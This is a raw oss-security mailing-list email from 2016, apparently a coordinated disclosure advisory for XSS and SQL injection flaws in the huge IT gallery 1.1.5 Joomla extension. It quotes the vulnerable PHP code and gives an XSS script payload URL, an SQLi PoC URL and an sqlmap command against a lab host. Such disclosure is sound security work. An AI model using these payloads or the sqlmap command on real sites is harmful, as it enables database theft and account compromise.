X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6142" "Saturday" "23" "July" "2016" "14:59:16" "+0000" "Larry W. Cashdollar" "larry0@me.com" "<5b1698b9-7904-43ba-9fda-c2d5569f8028@me.com>" "123" "[oss-security] XSS and SQLi in huge IT gallery v1.1.5 for Joomla" nil nil nil "7" "2016072314:59:16" "[oss-security] XSS and SQLi in huge IT gallery v1.1.5 for Joomla" (number mark "U       larry0@me.co Jul 23  123/6142  " thread-indent "\"[oss-security] XSS and SQLi in huge IT gallery v1.1.5 for Joomla\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1487 invoked by uid 550); 23 Jul 2016 15:00:15 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 32754 invoked from network); 23 Jul 2016 14:59:30 -0000
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-07-23_12:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1510270003 definitions=main-1607230182
MIME-version: 1.0
Content-type: multipart/alternative;
 boundary="Boundary_(ID_D4iF2YRamzmojCo0GymG7Q)"
To: Open Source Security <oss-security@lists.openwall.com>
From: "Larry W. Cashdollar" <larry0@me.com>
Date: Sat, 23 Jul 2016 14:59:16 +0000 (GMT)
X-Mailer: iCloud MailClient16EProject70
 MailServer16E78.25278-16A-1132-e21ea0a6a8b6
X-Originating-IP: [108.176.228.3]
Message-id: <5b1698b9-7904-43ba-9fda-c2d5569f8028@me.com>
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1469285957; bh=Ogt+Six38xlEPUaJyyhbX2ErOWIoxBB4EQ+Ro0Yc+ro=;
	h=MIME-version:Content-type:To:From:Subject:Date:Message-id;
	b=iYiD77D64nkB7bw4tD8G5k0AfpdQpd3mIgyZ9Na/gvegbBPGRPrPAUPp/6OmkH6xS
 zEC1QJxePsFmatCT3qG3WQpsN+04P0txXhvoN/IEEx1Gnsp96eirtB4TCKV+TwVYLP
 8EDBBmFfWqVn2PpUPIH1SmyJHKZLG7G92LzwhkSdr+Fi7Zd0iOeW9wKvM00IvjDz02
 moM7G8bHiXd1r/nobqc8sow9luXGvq79I76qGJNMh1fPJTGgUbrVxQnpkMmwrx+7pt
 lUkRHZvIistu05bNCl7GZTWfrbcmYonFO8NH68ToRJeRHMOSfyR1gGON/CleedpZCN
 CG//HCppHNcvw==
Subject: [oss-security] XSS and SQLi in huge IT gallery v1.1.5 for Joomla

--Boundary_(ID_D4iF2YRamzmojCo0GymG7Q)
Content-type: text/plain; charset=utf-8; format=flowed
Content-transfer-encoding: quoted-printable

Title: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
Fixed: v1.1.7
Author: Larry W. Cashdollar, @_larry0 and Elitza Neytcheva, @ElitzaNeytcheva
Date: 2016-07-14
Download Site: http://extensions.joomla.org/extensions/extension/photos-a-i=
mages/galleries/gallery-pro
Vendor: huge-it.com
Vendor Notified: 2016-07-15, fixed 2016-07-23
Vendor Contact: info@huge-it.com
Description: The plugin allows you to add multiple images to the gallery, c=
reate countless galleries, add a description to each of them, as well as ma=
ke the same things with video links.
Vulnerability:
The attacker must be logged in with at least manager level access or access=
 to the administrative panel to exploit this vulnerability:

SQL in code via id parameter:
./administrator/components/com_gallery/models/gallery.php
51 public function getPropertie() {
52 $db =3D JFactory::getDBO();
53 $id_cat =3D JRequest::getVar('id');
54 $query =3D $db->getQuery(true);
55 $query->select('#__huge_itgallery_images.name as name,'
56 . '#__huge_itgallery_images.id ,'
57 . '#__huge_itgallery_gallerys.name as portName,'
58 . 'gallery_id, #__huge_itgallery_images.description as description,image=
_url,sl_url,sl_type,link_target,#__huge_itg allery_images.ordering,#__huge_=
itgallery_images.published,published_in_sl_width');
59 $query->from(array('#__huge_itgallery_gallerys' =3D> '#__huge_itgallery_=
gallerys', '#__huge_itgallery_images' =3D> '#__huge_itg allery_images'));
60 $query->where('#__huge_itgallery_gallerys.id =3D gallery_id')->where('ga=
llery_id=3D' . $id_cat);
61 $query->order('ordering desc');
62=20
64 $db->setQuery($query);
65 $results =3D $db->loadObjectList();
66 return $results;
67 }



XSS is here:

root@Joomla:/var/www/html# find . -name "*.php" -exec grep -l "echo \$_GET"=
 {} \;
./administrator/components/com_gallery/views/gallery/tmpl/default.php
root@Joomla:/var/www/html# find . -name "*.php" -exec grep -n "echo \$_GET"=
 {} \;
256: <a class=3D"modal" rel=3D"{handler: 'iframe', size: {x: 800, y: 500}}"=
 href=3D"index.php?option=3Dcom_gallery&view=3Dvideo&tmpl=3Dcomponent&pid=
=3D<?php echo $_GET['id']; ?>" title=3D"Image" >
CVE-2016-1000113 2016-1000114
JSON: Export
Exploit Code:
XSS PoC
http://192.168.0.125/administrator/index.php?option=3Dcom_gallery&view=3Dga=
llery&id=3D1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E

SQLi PoC
http://192.168.0.125/administrator/index.php?option=3Dcom_gallery&view=3Dga=
llery&id=3DSQLiHERE

$ sqlmap --load-cookies=3Dcookies.txt -u "http://192.168.0.125/administrato=
r/index.php?option=3Dcom_gallery&view=3Dgallery&id=3D*" --dbms mysql
Screen Shots:
Advisory:=C2=A0http://www.vapidlabs.com/advisory.php?v=3D164=

--Boundary_(ID_D4iF2YRamzmojCo0GymG7Q)
Content-type: multipart/related;
 boundary="Boundary_(ID_70JWip5QYKy/+4ep/e7oLA)"; type="text/html"


--Boundary_(ID_70JWip5QYKy/+4ep/e7oLA)
Content-type: text/html; CHARSET=US-ASCII
Content-transfer-encoding: quoted-printable

<html><body><div>Title: XSS and SQLi in huge IT gallery v1.1.5 for Joomla <=
/div><div>Fixed: v1.1.7<br>Author: Larry W. Cashdollar, @_larry0 and Elitza=
 Neytcheva, @ElitzaNeytcheva<br>Date: 2016-07-14<br>Download Site: http://e=
xtensions.joomla.org/extensions/extension/photos-a-images/galleries/gallery=
-pro<br>Vendor: huge-it.com<br>Vendor Notified: 2016-07-15, fixed 2016-07-2=
3<br>Vendor Contact: info@huge-it.com<br>Description: The plugin allows you=
 to add multiple images to the gallery, create countless galleries, add a d=
escription to each of them, as well as make the same things with video link=
s.<br>Vulnerability:<br>The attacker must be logged in with at least manage=
r level access or access to the administrative panel to exploit this vulner=
ability:<br><br>SQL in code via id parameter:<br>./administrator/components=
/com_gallery/models/gallery.php<br>51 public function getPropertie() {<br>5=
2 $db =3D JFactory::getDBO();<br>53 $id_cat =3D JRequest::getVar('id');<br>=
54 $query =3D $db-&gt;getQuery(true);<br>55 $query-&gt;select('#__huge_itga=
llery_images.name as name,'<br>56 . '#__huge_itgallery_images.id ,'<br>57 .=
 '#__huge_itgallery_gallerys.name as portName,'<br>58 . 'gallery_id, #__hug=
e_itgallery_images.description as description,image_url,sl_url,sl_type,link=
_target,#__huge_itg allery_images.ordering,#__huge_itgallery_images.publish=
ed,published_in_sl_width');<br>59 $query-&gt;from(array('#__huge_itgallery_=
gallerys' =3D&gt; '#__huge_itgallery_gallerys', '#__huge_itgallery_images' =
=3D&gt; '#__huge_itg allery_images'));<br>60 $query-&gt;where('#__huge_itga=
llery_gallerys.id =3D gallery_id')-&gt;where('gallery_id=3D' . $id_cat);<br=
>61 $query-&gt;order('ordering desc');<br>62 <br>64 $db-&gt;setQuery($query=
);<br>65 $results =3D $db-&gt;loadObjectList();<br>66 return $results;<br>6=
7 }<br><br><br><br>XSS is here:<br><br>root@Joomla:/var/www/html# find . -n=
ame "*.php" -exec grep -l "echo \$_GET" {} \;<br>./administrator/components=
/com_gallery/views/gallery/tmpl/default.php<br>root@Joomla:/var/www/html# f=
ind . -name "*.php" -exec grep -n "echo \$_GET" {} \;<br>256: &lt;a class=
=3D"modal" rel=3D"{handler: 'iframe', size: {x: 800, y: 500}}" href=3D"inde=
x.php?option=3Dcom_gallery&amp;view=3Dvideo&amp;tmpl=3Dcomponent&amp;pid=3D=
&lt;?php echo $_GET['id']; ?&gt;" title=3D"Image" &gt;<br>CVE-2016-1000113 =
2016-1000114<br>JSON: Export<br>Exploit Code:<br>XSS PoC<br>http://192.168.=
0.125/administrator/index.php?option=3Dcom_gallery&amp;view=3Dgallery&amp;i=
d=3D1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E<br> <br>SQLi PoC<br>http=
://192.168.0.125/administrator/index.php?option=3Dcom_gallery&amp;view=3Dga=
llery&amp;id=3DSQLiHERE<br> <br>$ sqlmap --load-cookies=3Dcookies.txt -u "h=
ttp://192.168.0.125/administrator/index.php?option=3Dcom_gallery&amp;view=
=3Dgallery&amp;id=3D*" --dbms mysql<br>Screen Shots:<br>Advisory:&nbsp;http=
://www.vapidlabs.com/advisory.php?v=3D164</div></body></html>=

--Boundary_(ID_70JWip5QYKy/+4ep/e7oLA)--

--Boundary_(ID_D4iF2YRamzmojCo0GymG7Q)--
